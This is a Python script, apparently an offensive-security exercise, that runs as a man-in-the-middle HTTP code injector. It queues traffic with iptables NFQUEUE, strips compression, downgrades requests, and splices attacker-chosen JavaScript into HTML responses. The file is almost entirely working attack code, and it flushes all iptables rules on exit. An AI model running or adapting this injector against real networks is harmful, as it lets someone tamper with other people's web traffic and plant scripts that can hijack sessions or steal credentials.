# iptables -I FORWARD -j NFQUEUE --queue-num 0 [The Queue number is User Specified] [This forwards the packets from remote computers to the NFQUEUE Chain.]
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0   [These Two commands to be used on Local Computer.]
# Modify the Injection_code Variable to your code. [Javascript Codes are Preferable]

import netfilterqueue
import scapy.all as scapy
from termcolor import colored
import re
import os
import argparse

injection_code = "<script>alert('skv1910');</script>"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--machine", dest="machine", help="Choose Target Machine (remote or local)")
    args = parser.parse_args()
    return args

def process_queue():
    queue = netfilterqueue.NetfilterQueue()  # Creating an Instance of NetFilterQueue.
    queue.bind(0, process_packets)  # Binding the instance to the '0' Queue-num in Iptables rule.
    queue.run()

def set_packet_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # To convert the Raw packets into scapy packets.
    if scapy_packet.haslayer(scapy.Raw):          # Checking for Raw Layer which contains the useful Data.
        load = scapy_packet[scapy.Raw].load
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                print(colored("[+] Request", "green"))
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
                print(colored("[+] Downgraded a Request to HTTP/1.0.", "green"))
            elif scapy_packet[scapy.TCP].sport == 80:
                print(colored("[+] Response", "yellow"))
                inject_code = injection_code
                if "</body>" in load:
                    load = load.replace("</body>", injection_code + "</body>")
                    print(colored("[+] Injected the Code.", "yellow"))
                    content_lenth_search = re.search("(?:Content-Length:\s)(\d*)", load)
                    if content_lenth_search and "text/html" in load:
                        content_lenth = content_lenth_search.group(1)
                        modified_content_lenth = int(content_lenth) + len(injection_code)
                        load = load.replace(content_lenth, str(modified_content_lenth))
                        print(colored("[+] Modified the Content Lenth.", "yellow"))
            if load != scapy_packet[scapy.Raw].load:
                modified_packet = set_packet_load(scapy_packet, load)
                packet.set_payload(str(modified_packet))
                print(colored("[+] Packet Modified with New Values.", "green"))

    packet.accept()                               # Forwarding the Packets.

def launch_attack():
    print(colored("[+] Code Injector Running..... ", "green"))
    args = get_arguments()
    if args.machine == "local":
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
        print(colored("[+] IPTables rules set to Local Machine.", "green"))
    elif args.machine == "remote":
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
        print(colored("[+] IPTables rules set to Remote Machine."))
    try:
        process_queue()
    except KeyboardInterrupt:
        print(colored("[-] Ctrl-C Detected... Quitting.. Restoring IPTables rules", "yellow"))
        os.system('iptables --flush')
        print(colored("[+] Restored IPTables.", "green"))

launch_attack()